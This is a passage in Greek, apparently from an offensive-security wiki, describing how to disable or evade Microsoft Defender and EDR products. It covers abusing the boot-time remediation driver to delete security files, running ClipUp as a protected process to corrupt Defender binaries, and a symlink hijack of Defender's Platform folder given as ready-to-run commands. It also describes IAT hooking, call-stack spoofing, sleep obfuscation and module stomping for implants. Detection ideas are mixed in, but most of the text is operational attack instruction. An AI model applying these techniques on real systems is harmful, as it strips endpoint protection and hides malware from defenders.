`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί I/O αρχείων από το `DriverEntry` πριν να είναι έτοιμα η στοίβα αποθήκευσης και ο σύνδεσμος `SystemRoot`. Το `Start=1` μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Phase 1: το NTFS είναι διαθέσιμο, αλλά πολλά προγράμματα οδήγησης ασφαλείας που ξεκινούν από το σύστημα και υπηρεσίες EDR σε user mode δεν έχουν αρχικοποιηθεί. Φίλτρα εκκίνησης όπως το `WdFilter` μπορεί να έχουν ήδη φορτωθεί, ωστόσο το BTR μπορεί να αφαιρέσει τα αρχεία τους ή τη διαμόρφωση των υπηρεσιών τους πριν από την επόμενη εκκίνηση, καθώς και να διαγράψει τα εκτελέσιμα αρχεία υπηρεσιών πριν τα εκκινήσει το SCM. Το ELAM δεν κλείνει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση των boot-start προγραμμάτων και φέρει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC προσθέτει στην αρχή την Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το log, έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την εκφόρτωση. Έτσι περιορίζονται τα ίχνη, ενώ η τοποθέτηση των δεδομένων ανατροφοδότησης στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του προγράμματος οδήγησης και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης υψηλής σημασίας

Οι κανόνες που βασίζονται μόνο στην υπογραφή και η λίστα αποκλεισμού ευάλωτων προγραμμάτων οδήγησης της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω συσχετίσεις συμπεριφοράς, διακρίνοντας παράλληλα τη νόμιμη προέλευση από το Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική στο staging του BTR. Ένα ADS `.dat` συνδεδεμένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το νόμιμο Defender συνήθως τοποθετεί τα δεδομένα ανατροφοδότησης κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender`, με την απουσία αντίστοιχου συμβάντος εγκατάστασης SCM.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού προγράμματος οδήγησης BTR από μη-Defender προέλευση με επακόλουθη διαγραφή αρχείων από το `System`/PID 4, ιδιαίτερα όταν πρόκειται για αρχεία ασφαλείας.
- **Sysmon 11 -> 23:** ειδοποιηθείτε για την ταχεία δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγξτε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`. Η υπογραφή Microsoft από μόνη της δεν αρκεί ως ένδειξη αξιοπιστίας όταν ένα πρόγραμμα οδήγησης εργαλείου ασφαλείας γίνεται staging από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για αλλοίωση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level, ώστε μόνο προστατευμένες διεργασίες ίδιου ή υψηλότερου επιπέδου να μπορούν να αλλοιώσουν η μία την άλλη. Για επιθετικούς σκοπούς, αν μπορείτε να εκκινήσετε νόμιμα ένα PPL-enabled binary και να ελέγξετε τα ορίσματά του, μπορείτε να μετατρέψετε αβλαβή λειτουργικότητα (π.χ. καταγραφή) σε έναν περιορισμένο μηχανισμό εγγραφής, υποστηριζόμενο από PPL, σε προστατευμένους καταλόγους που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι απαιτείται για να εκτελείται μια διεργασία ως PPL
- Το target EXE (και τυχόν φορτωμένα DLLs) πρέπει να είναι υπογεγραμμένο με EKU που υποστηρίζει PPL.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας που να αντιστοιχεί στον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για signers anti-malware, `PROTECTION_LEVEL_WINDOWS` για signers Windows). Τα εσφαλμένα επίπεδα θα προκαλέσουν αποτυχία κατά τη δημιουργία.

Δείτε επίσης εδώ μια ευρύτερη εισαγωγή στα PP/PPL και την προστασία LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο ανοιχτού κώδικα: CreateProcessAsPPL (επιλέγει επίπεδο προστασίας και προωθεί ορίσματα στο target EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο δυαδικό αρχείο συστήματος `C:\Windows\System32\ClipUp.exe` εκκινεί μια νέα διεργασία του εαυτού του και δέχεται μια παράμετρο για την εγγραφή ενός αρχείου καταγραφής σε διαδρομή που καθορίζει ο καλών.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή του αρχείου πραγματοποιείται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε σύντομες διαδρομές 8.3 για να δείξετε σε τοποθεσίες που συνήθως προστατεύονται.

Βοηθητικά εργαλεία για σύντομες διαδρομές 8.3
- Εμφάνιση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εύρεση σύντομης διαδρομής σε cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Αλυσίδα κατάχρησης (αφηρημένη)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Περάστε το όρισμα διαδρομής αρχείου καταγραφής του ClipUp για να επιβάλετε τη δημιουργία αρχείου σε έναν προστατευμένο κατάλογο AV (π.χ. Defender Platform). Χρησιμοποιήστε σύντομα ονόματα 8.3 αν χρειάζεται.
3) Αν το AV έχει συνήθως ανοιχτό/κλειδωμένο το δυαδικό αρχείο-στόχο ενώ εκτελείται (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας μια υπηρεσία αυτόματης εκκίνησης που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Κατά την επανεκκίνηση, η εγγραφή με υποστήριξη PPL πραγματοποιείται πριν το AV κλειδώσει τα δυαδικά του αρχεία, αλλοιώνοντας το αρχείο-στόχο και εμποδίζοντας την εκκίνηση.

Παράδειγμα κλήσης (οι διαδρομές έχουν αποκρυφτεί/συντομευτεί για λόγους ασφαλείας):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείς να ελέγξεις τα περιεχόμενα που γράφει το ClipUp· η primitive είναι κατάλληλη για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα χρονικό παράθυρο για επανεκκίνηση.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν ξεκινά από μη τυπικούς launchers, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να ξεκινούν αυτόματα ύποπτα binaries και να ξεκινούν σταθερά πριν από το Defender/AV. Διερεύνησε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για binaries/καταλόγους Platform του Defender· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με flags προστατευμένης διεργασίας.
- Τηλεμετρία ETW/EDR: αναζήτησε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και μη φυσιολογική χρήση επιπέδων PPL από binaries που δεν σχετίζονται με AV.

Μετριασμοί
- WDAC/Code Integrity: περιόρισε ποια υπογεγραμμένα binaries μπορούν να εκτελούνται ως PPL και από ποιες γονικές διεργασίες· μπλόκαρε την εκτέλεση του ClipUp εκτός νόμιμων πλαισίων.
- Υγιεινή υπηρεσιών: περιόρισε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολούθησε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιώσου ότι είναι ενεργοποιημένα η προστασία από παραποίηση του Defender και οι προστασίες πρώιμης εκκίνησης· διερεύνησε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Εξέτασε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 σε τόμους που φιλοξενούν εργαλεία ασφαλείας, εφόσον είναι συμβατό με το περιβάλλον σου (κάνε εκτενείς δοκιμές).

## Παραποίηση του Microsoft Defender μέσω Symlink Hijack στον φάκελο έκδοσης Platform

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους μέσα στο:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη λεξικογραφικά μεγαλύτερη συμβολοσειρά έκδοσης (π.χ. `4.18.25070.5-0`) και στη συνέχεια ξεκινά τις διεργασίες υπηρεσίας του Defender από εκεί (ενημερώνοντας ανάλογα τις διαδρομές υπηρεσίας/registry). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγου, συμπεριλαμβανομένων των σημείων επαναστόχευσης καταλόγου (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από attacker και να πετύχει DLL sideloading ή διακοπή της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Local Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks μέσα στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας από το Defender (επανεκκίνηση υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (`mklink`)

Γιατί λειτουργεί
- Το Defender εμποδίζει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις εγγραφές καταλόγου και επιλέγει την έκδοση με τη λεξικογραφικά μεγαλύτερη τιμή, χωρίς να επαληθεύει ότι ο προορισμός οδηγεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοίμασε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε μέσα στο Platform έναν συμβολικό σύνδεσμο καταλόγου νεότερης έκδοσης που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή διεργασίας στο `C:\TMP\AV\` και τη διαμόρφωση της υπηρεσίας/το registry να αντικατοπτρίζουν αυτήν τη θέση.

Επιλογές μετά την εκμετάλλευση
- DLL sideloading/code execution: Αποθέστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Διακοπή υπηρεσίας/άρνηση υπηρεσίας: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτυγχάνει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί δικαιώματα admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι ομάδες red team μπορούν να μεταφέρουν την αποφυγή εντοπισμού κατά την εκτέλεση από το C2 implant στην ίδια τη μονάδα-στόχο, κάνοντας hooking στον Import Address Table (IAT) της και δρομολογώντας επιλεγμένα API μέσω κώδικα ανεξάρτητου θέσης (PIC), ελεγχόμενου από τον επιτιθέμενο. Έτσι, η αποφυγή εντοπισμού επεκτείνεται πέρα από το περιορισμένο σύνολο API που διαθέτουν πολλά kits (π.χ. CreateProcessA) και οι ίδιες προστασίες εφαρμόζονται και σε BOFs και DLLs post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Τοποθετήστε ένα blob PIC δίπλα στη μονάδα-στόχο χρησιμοποιώντας reflective loader (ως πρόθεμα ή συνοδευτικό αρχείο). Το PIC πρέπει να είναι αυτόνομο και ανεξάρτητο θέσης.
- Καθώς φορτώνεται η DLL του host, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR της και τροποποιήστε τις εγγραφές IAT για τις στοχευμένες εισαγωγές (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε λεπτά wrappers PIC.
- Κάθε wrapper PIC εφαρμόζει τεχνικές αποφυγής εντοπισμού πριν καλέσει με tail-call τη διεύθυνση του πραγματικού API. Συνήθεις τεχνικές περιλαμβάνουν:
  - Απόκρυψη/επαναφορά μνήμης γύρω από την κλήση (π.χ. κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και, στη συνέχεια, επαναφορά.
  - Call-stack spoofing: κατασκευάστε ένα αθώο stack και μεταβείτε στο API-στόχο, ώστε η ανάλυση του call stack να εντοπίζει τα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για λόγους συμβατότητας, εξαγάγετε ένα interface ώστε ένα script Aggressor (ή αντίστοιχο) να μπορεί να δηλώνει ποια API θα γίνουν hook για Beacon, BOFs και DLLs post-exploitation.

Γιατί IAT hooking σε αυτή την περίπτωση
- Λειτουργεί για κάθε κώδικα που χρησιμοποιεί την εισαγωγή που έχει γίνει hook, χωρίς να τροποποιείται ο κώδικας του εργαλείου ή να βασίζεστε στο Beacon για τη διαμεσολάβηση συγκεκριμένων API.
- Καλύπτει DLLs post-exploitation: το hooking των LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στη φόρτωση μονάδων (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόζετε την ίδια απόκρυψη/αποφυγή μέσω stack στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση εντολών post-exploitation που δημιουργούν διεργασίες, απέναντι σε detections που βασίζονται στο call stack, μέσω wrapper για τα CreateProcessA/W.

Σχηματικό παράδειγμα ελάχιστου IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τα relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr δείχνουν hooking κατά τη διάρκεια του DllMain του φορτωμένου module.
- Κρατήστε τα wrappers μικρά και ασφαλή για PIC· επιλύστε το πραγματικό API μέσω της αρχικής τιμής IAT που καταγράψατε πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε μεταβάσεις RW → RX για PIC και αποφύγετε σελίδες που παραμένουν εγγράψιμες και εκτελέσιμες.

Stub πλαστογράφησης call-stack
- Τα PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη αλυσίδα κλήσεων (return addresses μέσα σε benign modules) και κατόπιν κάνουν pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδυάστε το με τεχνικές stack cutting/stack stitching, ώστε η εκτέλεση να καταλήγει στα αναμενόμενα frames πριν από το prologue του API.

Επιχειρησιακή ενσωμάτωση
- Προσθέστε τον reflective loader στην αρχή των post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποιήστε ένα Aggressor script για να καταχωρίσετε τα APIs-στόχους, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion χωρίς αλλαγές στον κώδικα.

Ζητήματα detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις εκτός image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: return addresses που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε PIC εκτός image· ασυνεπής προέλευση του RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές στην IAT εντός της διεργασίας, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, μη αναμενόμενες περιοχές RX που δημιουργούνται κατά τη φόρτωση.
- Παράκαμψη image-load: αν γίνεται hooking του LoadLibrary*, παρακολουθήστε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα masking μνήμης.

Συναφή δομικά στοιχεία και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ., TitanLdr, AceLdr)
- Hooks memory masking (π.χ., simplehook) και PIC stack-cutting (stackcutting)
- PIC stubs πλαστογράφησης call-stack (π.χ., Draugr)


## IAT Hooking κατά τη φόρτωση + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks κατά τη φόρτωση μέσω ενός resident PICO

Αν ελέγχετε έναν reflective loader, μπορείτε να κάνετε hooking στα imports **κατά τη διάρκεια** του `ProcessImports()` αντικαθιστώντας τον δείκτη `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιουργήστε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού αποδεσμευτεί το transient loader PIC.
- Εξαγάγετε μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ., `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παραλείψτε τα ordinal imports και χρησιμοποιήστε αναζήτηση hook βάσει hash, όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επιστρέψτε το· διαφορετικά, καλέστε τον πραγματικό `GetProcAddress`.
- Καταχωρίστε τους στόχους των hooks κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **ανακατεύθυνση IAT κατά τη φόρτωση** χωρίς patching του code section του φορτωμένου DLL μετά τη φόρτωση.

### Εξαναγκασμός hookable imports όταν ο στόχος χρησιμοποιεί PEB-walking

Τα hooks κατά τη φόρτωση ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στην IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), εξαναγκάστε ένα πραγματικό import, ώστε να το εντοπίσει η διαδρομή `ProcessImports()` του loader:

- Αντικαταστήστε την επίλυση hashed export (π.χ., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με μια άμεση αναφορά, όπως `&WaitForSingleObject`.
- Ο compiler δημιουργεί μια εγγραφή IAT, επιτρέποντας την παρέμβαση όταν ο reflective loader επιλύει τα imports.

### Sleep/idle obfuscation τύπου Ekko χωρίς patching του `Sleep()`

Αντί να κάνετε patch το `Sleep`, κάντε hooking στα **πραγματικά primitives αναμονής/IPC** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, τυλίξτε την κλήση σε μια αλυσίδα obfuscation τύπου Ekko, η οποία κρυπτογραφεί το image στη μνήμη κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποιήστε `CreateTimerQueueTimer` για να προγραμματίσετε μια ακολουθία callbacks που καλούν `NtContinue` με κατασκευασμένα `CONTEXT` frames.
- Τυπική αλυσίδα (x64): ορισμός του image σε `PAGE_READWRITE` → κρυπτογράφηση RC4 μέσω `advapi32!SystemFunction032` σε ολόκληρο το mapped image → εκτέλεση της blocking αναμονής → αποκρυπτογράφηση RC4 → **επαναφορά των δικαιωμάτων ανά section** με διάσχιση των PE sections → ειδοποίηση ολοκλήρωσης.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· κλωνοποιήστε το σε πολλαπλά frames και ορίστε registers (`Rip/Rcx/Rdx/R8/R9`) για να εκτελέσετε κάθε βήμα.

Επιχειρησιακή λεπτομέρεια: επιστρέψτε «success» για μεγάλες αναμονές (π.χ., `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ το image παραμένει masked. Αυτό το μοτίβο κρύβει το module από scanners κατά τα διαστήματα αδράνειας και αποφεύγει το κλασικό signature του «patched `Sleep()`».

Ιδέες detection (βάσει τηλεμετρίας)
- Ριπές callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους image.
- `VirtualProtect` σε μεγάλο εύρος, ακολουθούμενο από custom επαναφορά δικαιωμάτων ανά section.

### Runtime καταχώριση CFG για gadgets sleep-obfuscation

Σε στόχους με CFG ενεργό, το πρώτο indirect jump σε gadget στο μέσο μιας συνάρτησης, όπως `jmp [rbx]` ή `jmp rdi`, συνήθως θα προκαλέσει crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να παραμένουν ενεργές αλυσίδες τύπου Ekko/Kraken μέσα σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Καταχωρίστε κάθε indirect destination που χρησιμοποιεί η αλυσίδα με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει ολόκληρο το μέγεθος του image.
- Για manually mapped/PIC/stomped περιοχές, χρησιμοποιήστε αντί γι’ αυτό το **allocation base** και το μέγεθος της allocation.
- Σημειώστε όχι μόνο το dispatch gadget, αλλά και exports στα οποία γίνεται έμμεση πρόσβαση (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και κάθε executable section ελεγχόμενο από τον attacker που θα αποτελέσει indirect target.

Έτσι, οι αλυσίδες sleep τύπου ROP/JOP μετατρέπονται από «λειτουργεί μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe πλαστογράφηση stack για threads σε αναμονή

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να αποτύχει σε συστήματα CET Shadow Stack, επειδή ένα πλαστογραφημένο `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι το εξής:<sup>[[30]](#references)</sup>

- Επιλέξτε ένα άλλο thread στην ίδια διεργασία και διαβάστε τα όρια stack του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Δημιουργήστε αντίγραφο ασφαλείας του πραγματικού TEB/TIB του τρέχοντος thread.
- Καταγράψτε το πραγματικό context του thread που βρίσκεται σε αναμονή με το `GetThreadContext`.
- Αντιγράψτε **μόνο** το πραγματικό `Rip` στο spoof context, διατηρώντας αμετάβλητα τα spoofed `Rsp`/stack state.
- Κατά το διάστημα αναμονής, αντιγράψτε το `NT_TIB` του spoof thread στο τρέχον TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε ένα νόμιμο εύρος stack.
- Αφού ολοκληρωθεί η αναμονή, επαναφέρετε το αρχικό TIB και thread context.

Αυτό διατηρεί έναν instruction pointer συμβατό με CET, παραπλανώντας παράλληλα τους EDR stack walkers που βασίζονται στα metadata stack του TEB για να επικυρώσουν τα unwinds.

### Εναλλακτική με βάση APC: Kraken Mask

Αν η dispatch μέσω timer-queue έχει υπερβολικά αναγνωρίσιμο signature, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread με queued APCs:<sup>[[27]](#references)</sup>

- Δημιουργήστε ένα helper thread με entrypoint το `NtTestAlert`.
- Τοποθετήστε στην ουρά τα προετοιμασμένα `CONTEXT` frames/APCs με `NtQueueApcThread` και εκτελέστε τα με `NtAlertResumeThread`.
- Αποθηκεύστε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να αποφύγετε την εξάντληση του προεπιλεγμένου stack thread των 64 KB.
- Χρησιμοποιήστε το `NtSignalAndWaitForSingleObject` για να σηματοδοτήσετε ατομικά το start event και να μπλοκάρετε.
- Αναστείλετε το main thread πριν επαναφέρετε το TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειώσετε το χρονικό παράθυρο στο οποίο ένας scanner θα μπορούσε να εντοπίσει ένα stack που έχει αποκατασταθεί μόνο εν μέρει.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με signature helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` και στη συνέχεια άμεσες εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που καταλήγουν έμμεσα σε `SystemFunction032`, `VirtualProtect` ή helpers επαναφοράς δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures, όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`), ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το module stomping εκτελεί payloads από το **section `.text` ενός DLL που είναι ήδη mapped μέσα στη διεργασία-στόχο**, αντί να εκχωρεί εμφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο image που υποστηρίζεται από αρχείο στον δίσκο**, του οποίου ο χώρος κώδικα μπορεί να φιλοξενήσει το payload χωρίς να καταστρέψει code paths που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε κοινά modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι εύθραυστο: το DLL μπορεί να μην είναι φορτωμένο στην απομακρυσμένη διεργασία και μια πολύ μικρή περιοχή κώδικα θα προκαλέσει crash στη διεργασία. Μια πιο αξιόπιστη ροή εργασίας είναι:

1. Καταγράψτε τα modules της διεργασίας-στόχου και κρατήστε μια λίστα include **μόνο με ονόματα** των ήδη φορτωμένων DLLs.
2. Δημιουργήστε πρώτα το payload και καταγράψτε το **ακριβές μέγεθός του σε bytes**.
